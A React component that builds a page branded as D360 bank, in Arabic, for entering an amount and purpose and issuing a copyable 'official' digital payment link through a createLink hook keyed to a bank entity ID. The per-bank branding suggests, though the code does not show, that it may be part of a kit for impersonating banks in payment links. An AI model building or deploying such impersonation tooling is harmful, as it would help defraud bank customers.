
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useCreateLink';
import { ShadowIsolatedPage } from '@/components/ShadowIsolatedPage';

const D360LinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: 'bank',
      entityId: 'd360'
    });
  };

  const customCSS = `
    .container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #F5F5F5;
      font-family: 'Cairo', sans-serif;
      padding: 20px;
    }
    .card {
      width: 100%;
      max-width: 450px;
      background: white;
      border: 1px solid #eee;
      box-shadow: 0 10px 25px rgba(0,0,0,0.05);
      border-radius: 16px;
      overflow: hidden;
    }
    .header {
      background: #1A1A1A;
      padding: 30px;
      text-align: center;
      color: white;
    }
    .logo {
      height: 60px;
      margin-bottom: 10px;
    }
    .body {
      padding: 40px;
    }
    .field {
      margin-bottom: 20px;
    }
    .label {
      display: block;
      font-size: 14px;
      font-weight: 700;
      color: #666;
      margin-bottom: 8px;
    }
    input {
      width: 100%;
      height: 52px;
      border: 2px solid #f0f0f0;
      border-radius: 8px;
      padding: 0 15px;
      font-size: 18px;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }
    input:focus {
      outline: none;
      border-color: #1A1A1A;
    }
    button {
      width: 100%;
      height: 56px;
      background: #1A1A1A;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 10px;
      transition: opacity 0.2s;
    }
    button:disabled {
      opacity: 0.5;
    }
    .result {
      margin-top: 25px;
      padding: 20px;
      background: #f8fafc;
      border: 1px dashed #1A1A1A;
      border-radius: 8px;
      word-break: break-all;
      text-align: center;
    }
    .copy-btn {
      background: none;
      color: #1A1A1A;
      font-size: 12px;
      text-decoration: underline;
      cursor: pointer;
      margin-top: 10px;
    }
  `;

  return (
    <ShadowIsolatedPage css={customCSS}>
      <div className="container">
        <div className="card">
          <div className="header">
            <img src={`/assets/logos/d360.svg`} alt="D360" className="logo" />
            <div style={{ fontSize: '20px', fontWeight: 'bold' }}>D360 بنك</div>
          </div>
          <div className="body">
            <div className="field">
              <span className="label">المبلغ المطلوب</span>
              <input 
                type="number" 
                placeholder="0.00" 
                value={amount} 
                onChange={(e) => setAmount(e.target.value)} 
              />
            </div>
            <div className="field">
              <span className="label">البيان / الغرض</span>
              <input 
                type="text" 
                placeholder="تفاصيل العملية" 
                value={description} 
                onChange={(e) => setDescription(e.target.value)} 
              />
            </div>
            <button onClick={handleCreate} disabled={loading}>
              {loading ? 'جاري الإصدار...' : 'إصدار رابط الدفع الرقمي'}
            </button>
            
            {generatedLink && (
              <div className="result">
                <div style={{ color: '#444', fontSize: '12px', marginBottom: '8px' }}>الرابط الرسمي:</div>
                <div style={{ fontWeight: 'bold', color: '#1A1A1A' }}>{generatedLink}</div>
                <div className="copy-btn" onClick={() => navigator.clipboard.writeText(generatedLink)}>نسخ الرابط</div>
              </div>
            )}
          </div>
        </div>
      </div>
    </ShadowIsolatedPage>
  );
};

export default D360LinkCreator;
